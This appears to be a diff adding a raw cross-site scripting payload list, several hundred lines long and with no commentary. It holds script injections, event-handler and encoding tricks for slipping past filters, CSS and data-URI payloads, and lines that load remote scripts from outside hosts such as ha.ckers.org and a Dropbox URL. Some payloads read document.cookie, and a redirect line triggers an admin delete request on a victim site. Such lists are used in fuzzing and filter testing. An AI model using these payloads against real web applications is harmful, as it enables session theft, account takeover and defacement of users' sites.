+&lt;body onscroll=javascript:alert(1)&gt;<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&lt;input autofocus&gt;
+<p>
+&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;
+&lt;STYLE&gt;a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}&lt;/STYLE&gt;
+&lt;meta charset= "x-imap4-modified-utf7"&&&gt;&&&lt;script&&&gt;javascript:alert(1)&&;&&&lt;&&/script&&&gt;
+&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;
+&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;
+&lt;?xml version="1.0"?&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;
+&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;
+&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;
+&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;
+&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;
+&lt;object onerror=javascript:javascript:alert(1)&gt;
+&lt;embed type="image" src=%(scriptlet)s&gt;&lt;/embed&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[<img src>]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;
+<img src>
+<a href>test1</a>
+<a href>test1</a>
+&lt;embed width=500 height=500 code="data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;"&gt;&lt;/embed&gt;
+&lt;iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;&gt;"&gt;
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+'';!--"&lt;XSS&gt;=&{()}
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+<a>xxs link</a>
+<a>xxs link</a>
+<img>&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+<img src>
+<img src="#">
+<img src>
+<img>
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+perl -e 'print "<img src>";' &gt; out
+<img src>
+&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
+&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+&lt;IMG SRC="javascript:alert('XSS')"
+&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
+\";alert('XSS');//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
+<img>
+<img>
+&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;<ul><li>XSS</br>
+<img src>
+<img src>
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+<br>
+&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;
+&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
+&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;
+&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
+<img>
+exp/*<a>
+&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
+&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;<a></a>
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
+&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
+¼script¾alert(¢XSS¢)¼/script¾
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
+<table>
+<table><td>
+<div>
+<div>
+<div>
+<div>
+&lt;BASE HREF="javascript:alert('XSS');//"&gt;
+ &lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
+&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
+
+&lt;? echo('&lt;SCR)';echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
+<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
+ &lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT ="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="&gt;" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+<a href="http://66.102.7.147/">XSS</a>
+<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</a>
+<a href="http://1113982867/">XSS</a>
+<a href="http://0x42.0x0000066.0x7.0x93/">XSS</a>
+<a href="http://0102.0146.0007.00000223/">XSS</a>
+<a href>XSS</a>
+&lt;iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00&gt;
+&lt;svg&gt;&lt;style&gt;{font-family&colon;'&lt;iframe/onload=confirm(1)&gt;'
+&lt;input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&lt;sVg&gt;&lt;scRipt %00&gt;alert&lpar;1&rpar; {Opera}
+&lt;img/src=`%00` onerror=this.onerror=confirm(1) 
+&lt;form&gt;&lt;isindex formaction="javascript&colon;confirm(1)"
+&lt;img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+&lt;script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;&gt;&lt;/script&gt;
+&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?
+&lt;iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;
+&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/
+&#34;&#62;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00
+&lt;iframe/src="data:text/html,&lt;svg &#111;&#110;load=alert(1)&gt;"&gt;
+&lt;meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/&gt;
+&lt;svg&gt;&lt;script xlink:href=data&colon;,window.open('https://www.google.com/')&gt;&lt;/script
+&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;
+&lt;iframe src=javascript&colon;alert&lpar;document&period;location&rpar;&gt;
+&lt;form&gt;<a href>X
+&lt;/script&gt;&lt;img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'&gt;
+&lt;img/&#09;&#10;&#11; src=`~` onerror=prompt(1)&gt;
+&lt;form&gt;&lt;iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;&gt;
+<a href>X&lt;/a
+http://www.google&lt;script .com&gt;alert(document.location)&lt;/script
+&lt;a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"&gt;XYZ&lt;/a
+&lt;img/src=@&#32;&#13; onerror = prompt('&#49;')
+&lt;style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^
+&lt;/style &#32;&gt;&lt;script &#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &#32; :-(
+&#00;&lt;/form&gt;&lt;input type&#61;"date" onfocus="alert(1)"&gt;
+&lt;form&gt;&lt;textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'&gt;
+&lt;script /***/&gt;/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/&lt;/script /***/
+&lt;iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'&gt;
+<a href>X</a>
+&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;
+&lt;style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;&gt;
+&lt;///style///&gt;<span>SPAN
+&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#34;&#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&colon;'&lt;body/onload=confirm(1)&gt;'
+&#13;&lt;blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)&gt;OnMouseOver {Firefox & Opera}
+&lt;marquee onstart='javascript:alert&#x28;1&#x29;'&gt;^__^
+&lt;div/style="width:expression(confirm(1))"&gt;X</div> {IE7}
+&lt;iframe/%00/ src=javaSCRIPT&colon;alert(1)
+//&lt;form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;&gt;&lt;input/type='submit'&gt;//
+/*iframe/src*/&lt;iframe/src="&lt;iframe/src=@"/onload=prompt(1) /*iframe/src*/&gt;
+//|\\ &lt;script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\ &lt;/script //|\\
+</font>/&lt;svg&gt;&lt;style&gt;{src&#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'</font>/&lt;/style&gt;
+&lt;a/href="javascript:&#13; javascript:prompt(1)"&gt;&lt;input type="X"&gt;
+&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)
+&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&#x28;1&#x29; {Opera}
+<a href>&lt;button&gt;
+<div>DIV</div>
+&lt;iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;
+<a href>X</a>
+&lt;embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
+&lt;object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
+&lt;var onmouseover="prompt(1)"&gt;On Mouse Over&lt;/var&gt;
+<a href>Click Here</a>
+<img src="/" title="onerror='prompt(1)'">
+&lt;%
+&lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;
+&lt;iframe/src \/\/onload = prompt(1)
+&lt;iframe/onreadystatechange=alert(1)
+&lt;svg/onload=alert(1)
+&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)
+&lt;input type="text" value=`` &lt;div/onmouseover='alert(1)'&gt;X</div>
+http://www.&lt;script&gt;alert(1)&lt;/script .com
+&lt;iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29&gt;&lt;/iframe&gt;
+&lt;svg&gt;&lt;script ?&gt;alert(1)
+&lt;iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29&gt;&lt;/iframe&gt;
+<img src>
+&lt;object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "&gt;&lt;/object&gt;
+&lt;meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/&gt;
+&lt;math&gt;<a>click
+&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;
+&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1
+<a href>X&lt;/a
+&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE&gt;
+&lt;script&gt;~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script U+
+&lt;script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"&gt;&lt;/script a=\u0061 & /=%2F
+&lt;script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script
+&lt;object data=javascript&colon;\u0061&#x6C;&#101%72t(1)&gt;
+&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
+&lt;body/onload=&lt;!--&gt;&#10alert(1)&gt;
+&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script
+&lt;img src ?itworksonchrome?\/onerror = alert(1)
+&lt;svg&gt;&lt;script&gt;//&NewLine;confirm(1);&lt;/script &lt;/svg&gt;
+&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)
+<a href>ClickMe
+&lt;script x&gt; alert(1) &lt;/script 1=2
+&lt;div/onmouseover='alert(1)'&gt; style="x:"&gt;
+&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;
+&lt;script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)&gt;&lt;/script&gt;
+<div>x&lt;/button&gt;
+"&gt;<img src>
+&lt;form&gt;&lt;button formaction=javascript&colon;alert(1)&gt;CLICKME
+&lt;math&gt;<a>click
+&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;
+&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;
+<a href>Click Me</a>
